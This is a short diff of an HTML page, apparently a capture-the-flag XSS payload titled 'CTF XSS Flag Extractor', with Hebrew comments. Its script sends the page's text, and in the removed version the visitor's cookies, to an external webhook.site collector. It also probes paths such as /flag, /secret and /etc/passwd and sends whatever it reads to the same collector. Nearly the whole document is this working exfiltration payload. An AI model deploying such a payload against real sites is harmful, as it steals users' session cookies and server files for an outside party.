@@ -1,14 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><title>XSS + Webhook Test</title></head>
+<head><title>CTF XSS Flag Extractor</title></head>
 <body>
-  <h1>JS Execution Test</h1>
+  <h1>Flag Hunter</h1>
   <script>
-    // שולח בקשה ל־webhook עם קובצי cookie או תוכן הדף
-    fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?cookie=' + encodeURIComponent(document.cookie || document.body.innerText));
-    
-    // מציג אישור על ריצת JS בדף
-    document.body.insertAdjacentHTML('beforeend', '<p style="color:red">✅ JS Executed!</p>');
+    // 1. שולח את כל הטקסט שבדף ל-webhook
+    fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?content=' + encodeURIComponent(document.body.innerText));
+
+    // 2. מנסה לקרוא דגל מכתובות נפוצות
+    const paths = ['/flag', '/flag.txt', '/secret', '/secret.txt', '/etc/passwd'];
+    paths.forEach(path => {
+      fetch(path)
+        .then(r => r.text())
+        .then(data => {
+          fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?found=' + encodeURIComponent(path + ' => ' + data));
+        })
+        .catch(e => {});
+    });
+
+    // 3. הודעת אישור מקומית
+    document.body.insertAdjacentHTML('beforeend', '<p style="color:green">✅ Flag script ran</p>');
   </script>
 </body>
 </html>
